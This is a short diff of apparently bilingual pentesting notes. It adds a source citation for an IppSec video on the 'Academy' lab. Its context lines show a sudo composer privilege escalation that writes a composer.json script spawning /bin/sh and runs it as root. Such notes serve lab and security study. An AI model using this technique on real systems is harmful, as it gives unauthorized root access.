@@ -105,3 +105,7 @@ TF=$(mktemp -d)
 echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
 sudo composer --working-dir=$TF run-script x
 ```
+
+## Fuentes / Sources
+
+- [IppSec: Academy (video)](https://youtube.com/watch?v=yQl5RA6APyQ) - IppSec - fecha de acceso: 2026-09-24.
